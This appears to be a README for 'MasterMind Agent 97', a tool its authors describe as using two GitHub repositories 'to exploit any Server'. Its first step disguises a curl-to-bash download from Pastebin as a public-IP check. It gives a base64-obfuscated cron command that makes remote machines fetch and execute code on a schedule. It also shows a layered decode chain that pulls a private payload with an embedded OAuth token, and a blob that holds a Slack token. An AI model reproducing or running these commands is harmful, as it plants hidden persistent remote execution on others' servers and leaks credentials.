#### Welcome  [ MasterMind Agent 97 ]

**Agent 97** : v0.0.3

Let's Explore **MasterMind Agent 97**

Run below command to Get Your Public IP.
```bash
  # Retrive Your Public IP
  curl -s https://pastebin.com/raw/DGbDe6LZ|bash -
```

##### Step 1

Create Script and encode with base64
```bash
# /tmp/script.sh
#!/bin/bash
echo "hello World"
ifconfig
ls -la
pwd
```

##### Encode with Base64
Create `mm.key` file using below command  and commit this file in `MasterMind` repository.
```bash
# Command will create encoded file mm.key
 base64 /tmp/script.sh > <MasterMind Repo>/mm.key
```


#### Lets Explore More about Backend Concept.

##### How to install MasterMind Agent
We require to configure below command on remote machine. we can configure cron to execute periodically.

```bash
# below commmand should be run from remote machine.
#vim vim /etc/cron.daily/mm
eval $(echo "Y3VybCAtc0wgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3N3dXhlbi9sSS9tYXN0ZXIvcy50eHR8YmFzZTY0IC1kCg=="|base64 -d|bash -)
```
#### Layars Decode :

 1. Decoded `curl -sL https://raw.githubusercontent.com/swuxen/lI/master/s.txt|base64 -d`

 ```bash
#curl -sL https://raw.githubusercontent.com/swuxen/lI/master/s.txt|base64 -d
echo "curl -sL https://raw.githubusercontent.com/swuxen/lI/master/s.txt|base64 -d"|base64

 # output
Y3VybCAtc0wgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3N3dXhlbi9sSS9tYXN0ZXIvcy50eHR8YmFzZTY0IC1kCg==
 ```

 2. Decoded : `curl -sL https://raw.githubusercontent.com/swuxen/lI/master/s.txt|base64 -d`

  ```bash
  # data s.txt
  curl -sL https://raw.githubusercontent.com/swuxen/lI/master/s.txt

  # output: Encoded : s.txt
  Y3VybCAtc0wgLXUgYTgwNDczMTg1YjNmYTM2NTNiMmZjNmMzYzJjMjY5OWRjY2M1NWFjNzp4LW9hdXRoLWJhc2ljIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zd3V4ZW4vbWFzdGVybWluZC9tYXN0ZXIvbW0ua2V5fGJhc2U2NCAtZHxiYXNoIC0K

  # Decoding s.txt file
  curl -sL https://raw.githubusercontent.com/swuxen/lI/master/s.txt|base64 -d
  # output : Decoded : s.txt
  curl -sL -u a80473185b3fa3653b2fc6c3c2c2699dccc55ac7:x-oauth-basic https://raw.githubusercontent.com/swuxen/mastermind/master/mm.key|base64 -d|bash -

  ```

 3. Decoded : `curl -sL -u a80473185b3fa3653b2fc6c3c2c2699dccc55ac7:x-oauth-basic https://raw.githubusercontent.com/swuxen/mastermind/master/mm.key|base64 -d|bash -`
  ```bash
  # File data : mm.key file
  curl -sL -u a80473185b3fa3653b2fc6c3c2c2699dccc55ac7:x-oauth-basic https://raw.githubusercontent.com/swuxen/mastermind/master/mm.key

  # output :
  IyEvYmluL2Jhc2gKZXhwb3J0IFNMQUNLX0NMSV9UT0tFTj0neG94Yi05NTI4MjkzMTc2MzUtOTU3
  OTQ3MTQxNjk5LUdVWXJFM2I2ZXhIWmNvS3dQaDM0QVlTYycKZXhwb3J0IFNMQUNLX0NIQU5ORUw9
  IiNkZXZvcHMiClNMQUNLX0JJTj0iL3Vzci9iaW4vbXNsYWNrIgpnZXRfc2VydmVyX2luZm8oKXsK
  ICBleHBvcnQgUFJJVkFURV9JUD0kKGhvc3RuYW1lIC1JKQogIGV4cG9ydCBQVUJfSVA9JChjdXJs
  IC1zIGljYW5oYXppcC5jb20pCiAgZXhwb3J0IFRJTUVTVEFNUD0kKGRhdGUpCn0KZ2V0X3VzZXJf
  ZGF0YSgpewogIGxvZ19wYXRoPS90bXAvdWluZm8ubG9nCiAgZ2V0X3NlcnZlcl9pbmZvCiAgZWNo
  byAiCkEgU1NIIGxvZ2luIHdhcyBzdWNjZXNzZnVsLCBzbyBoZXJlIGFyZSBzb21lIGluZm9ybWF0
  aW9uIGZvciBzZWN1cml0eToKICAgIFVzZXIgICAgICAgICAgIDogICRVU0VSCiAgICBVc2VyIElQ
  IEhvc3QgICA6ICAke1NTSF9DTElFTlQvICp9CiAgICBEYXRlICAgICAgICAgICA6ICAke1RJTUVT
  VEFNUH0KICAgIEhvc3RuYW1lICAgICAgIDogIGBob3N0bmFtZWAKICAgIFNlcnZlciBJUCAgICAg
  IDogICR7UFVCX0lQfSB8ICR7UFJJVkFURV9JUH0KCiAgICBXZSB3aWxsIG5vdGlmeSB5b3Ugb25j
  ZSB1c2VyWyRVU0VSXSB3aWxsIGVuZCBzZXNzaW9uLgogICIgPiAke2xvZ19wYXRofQoKICBpZiBb
  WyAtZiAiJHtsb2dfcGF0aH0iIF1dOyB0aGVuCiAgICBjYXQgJHtsb2dfcGF0aH0gfCAke1NMQUNL
  X0JJTn0gY2hhdCBzZW5kIC0tY2hhbm5lbCAiJHtTTEFDS19DSEFOTkVMfSIgXAogICAgICAtLXRp
  dGxlICJTU0ggbG9naW4gc3VjY2Vzc2Z1bCAtICR7VVNFUn1AJHtQUklWQVRFX0lQfSBvbiAke1RJ
  TUVTVEFNUH0iIFwKICAgICAgLS1jb2xvciBnb29kID4gL2Rldi9udWxsIDI+JjEKICAgIHJtIC1m
  ICR7bG9nX3BhdGh9CiAgZmkKfQpnZXRfdXNlcl9kYXRhCg==

  # Decoding mm.key
   curl -sL -u a80473185b3fa3653b2fc6c3c2c2699dccc55ac7:x-oauth-basic https://raw.githubusercontent.com/swuxen/mastermind/master/mm.key|base64 -d

   # Decoded output : /tmp/script.sh | mm.key
   #!/bin/bash
   echo "hello World"
   ifconfig
   ls -la
   pwd
  ```

We are using two repository to exploit any Server.

- Public Repository -  https://github.com/swuxen/lI.git
- Private Repository - https://github.com/swuxen/mastermind
